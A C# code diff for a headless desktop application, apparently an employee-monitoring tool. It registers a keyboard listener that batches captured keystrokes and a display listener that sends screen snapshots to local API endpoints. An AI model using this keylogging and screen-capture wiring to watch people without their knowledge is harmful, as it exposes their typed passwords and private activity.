@@ -24,39 +24,87 @@ namespace EMS.Desktop.Headless
         {
             var injector = UnityInjector.Instance;
 
-            injector
-                .Register<IWin32ApiProvider, Win32ApiProvider>()
-                .RegisterInstance<KeyboardApiConfig>(new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
-                .Register<IKeyboardApi, KeyboardApi>(injector.Resolve<IWin32ApiProvider>(), injector.Resolve<KeyboardApiConfig>())
-                .Register<IHttpClient, DefaultHttpClient>()
-                .RegisterInstance<KeyboardListenerConfig>(new KeyboardListenerConfig
-                {
-                    SendCapturedItemsThreshold = 20,
-                    SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
-                    RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
-                    SendCapturedItemsTimerConfig = new TimerConfig
-                    {
-                        DueTime = 5000,
-                        Period = 2000
-                    }
-                })
-                .Register<IListener, KeyboardListener>(nameof(KeyboardListener), injector.Resolve<IHttpClient>(), injector.Resolve<IKeyboardApi>(), injector.Resolve<KeyboardListenerConfig>());
+            //injector
+            //    .Register<IWin32ApiProvider, Win32ApiProvider>()
+            //    .RegisterInstance<KeyboardApiConfig>(
+            //        new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
+            //    .Register<IKeyboardApi, KeyboardApi>(
+            //        injector.Resolve<IWin32ApiProvider>(),
+            //        injector.Resolve<KeyboardApiConfig>())
+            //    .Register<IHttpClient, DefaultHttpClient>()
+            //    .RegisterInstance<KeyboardListenerConfig>(
+            //        new KeyboardListenerConfig
+            //        {
+            //            SendCapturedItemsThreshold = 20,
+            //            SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
+            //            RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
+            //            SendCapturedItemsTimerConfig = new TimerConfig
+            //            {
+            //                DueTime = 5000,
+            //                Period = 2000
+            //            }
+            //        })
+            //    .Register<IListener, KeyboardListener>(
+            //        nameof(KeyboardListener),
+            //        injector.Resolve<IHttpClient>(),
+            //        injector.Resolve<IKeyboardApi>(),
+            //        injector.Resolve<KeyboardListenerConfig>());
 
-            this.RegisterSerilog();
+            this.RegisterLogger(injector);
+
+            injector
+                .Register<IHttpClient, DefaultHttpClient>()
+                .Register<IWin32ApiProvider, Win32ApiProvider>()
+                .RegisterInstance<KeyboardApiConfig>(
+                    new KeyboardApiConfig { SleepIntervalInMilliseconds = 15 })
+                .RegisterInstance<DisplayApiConfig>(
+                    new DisplayApiConfig { DisplayWatcherSleepIntervalInMilliseconds = 1000 })
+                .Register<IKeyboardApi, KeyboardApi>()
+                .Register<IDisplayApi, DisplayApi>()
+                .RegisterInstance<KeyboardListenerConfig>(
+                    new KeyboardListenerConfig
+                    {
+                        SendCapturedItemsThreshold = 20,
+                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/CapturedKeys/PostCapturedKeys",
+                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
+                        SendCapturedItemsTimerConfig = new TimerConfig
+                        {
+                            DueTime = 5000,
+                            Period = 2000
+                        }
+                    })
+                .RegisterInstance<DisplayListenerConfig>(
+                    new DisplayListenerConfig
+                    {
+                        SendCapturedItemsThreshold = 3,
+                        SendCapturedItemsDestinationUri = "http://localhost:64435/api/DisplaySnapshots/PostCapturedDisplaySnapshots",
+                        RetrySleepDurationsInMilliseconds = new List<int> { 1000, 2000, 3000 },
+                        SendCapturedItemsTimerConfig = new TimerConfig
+                        {
+                            DueTime = 5000,
+                            Period = 2000
+                        }
+                    })
+                .Register<IListener, KeyboardListener>(nameof(KeyboardListener))
+                .Register<IListener, DisplayListener>(nameof(DisplayListener));
+
+            var keyboardApi = injector.Resolve<IKeyboardApi>();
 
             return injector;
         }
 
-        private void RegisterSerilog()
+        private void RegisterLogger(IInjector injector)
         {
-            var delimiter = Environment.NewLine;
+            var delimiter = new string('*', 40);
             var formatter = new JsonFormatter(closingDelimiter: delimiter);
             var logsFilePath = @"..\..\Logs\Serilog.txt";
 
-            Log.Logger = new LoggerConfiguration()
+            var logger = new LoggerConfiguration()
                 .MinimumLevel.Debug()
                 .WriteTo.File(formatter, logsFilePath)
                 .CreateLogger();
+
+            injector.RegisterInstance<ILogger>(logger);
         }
     }
 }
